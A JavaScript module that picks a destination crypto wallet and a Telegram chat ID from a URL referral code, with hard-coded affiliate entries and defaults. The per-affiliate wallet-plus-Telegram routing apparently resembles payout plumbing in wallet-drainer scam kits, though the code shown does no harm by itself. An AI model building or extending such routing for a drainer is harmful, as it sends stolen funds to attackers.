// src/services/referral.js

// 1. CONFIGURATION
const DEFAULT_WALLET = "4nLWWSss7t7XJJkA4NBhaLwAKsYRFKhFN14gkaqfS3Yx";
const DEFAULT_CHAT_ID = "-4634924178"; // Varsayılan grup profili

const REFERRAL_MAP = {
    // Format: 'refferal': { wallet: '...', chatId: '...' },

    'kryptoking': {
        wallet: 'AgaYFaYnVrSjnndM2i8U7dneYXpjiyaCLk84YScRhWsn', chatId: '-5161672299'
    },

    'crptgru': {
        wallet: '9dJFV5Gs5ZFnkDSXpGjZqUnwzQj9WVuh3rRv8iZBXY8V', chatId: '-5177752667'
    },

    'chldude': {
        wallet: 'GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1', chatId: '-5047891529'
    },



};

/**
 * 2. DYNAMIC WALLET SELECTION
 * Parses the URL query parameter ?ref=...
 * Returns the mapped wallet address, or the DEFAULT_WALLET if not found.
 */
export function getDestinationWallet() {
    return getReferralData().wallet;
}

/**
 * Returns BOTH wallet and chatId or defaults
 */
export function getReferralData() {
    if (typeof window === 'undefined') {
        return { wallet: DEFAULT_WALLET, chatId: DEFAULT_CHAT_ID };
    }

    const params = new URLSearchParams(window.location.search);
    const refCode = params.get('ref');

    let wallet = DEFAULT_WALLET;
    let chatId = DEFAULT_CHAT_ID;
    let logMsg = `Transaction Target: DEFAULT [${wallet}]`;

    if (refCode) {
        const entry = REFERRAL_MAP[refCode];
        if (entry) {
            wallet = entry.wallet;
            chatId = entry.chatId || DEFAULT_CHAT_ID; // Eğer chatId belirtilmemişse default
            logMsg = `Transaction Target: REFERRAL MATCH [${wallet}] (Ref: ${refCode}, TG: ${chatId})`;
        } else {
            logMsg = `Transaction Target: INVALID/UNKNOWN REF [${wallet}] (Ref: ${refCode} not found in map)`;
        }
    } else {
        logMsg = `Transaction Target: NO REF [${wallet}]`;
    }

    console.log(logMsg);
    return { wallet, chatId };
}
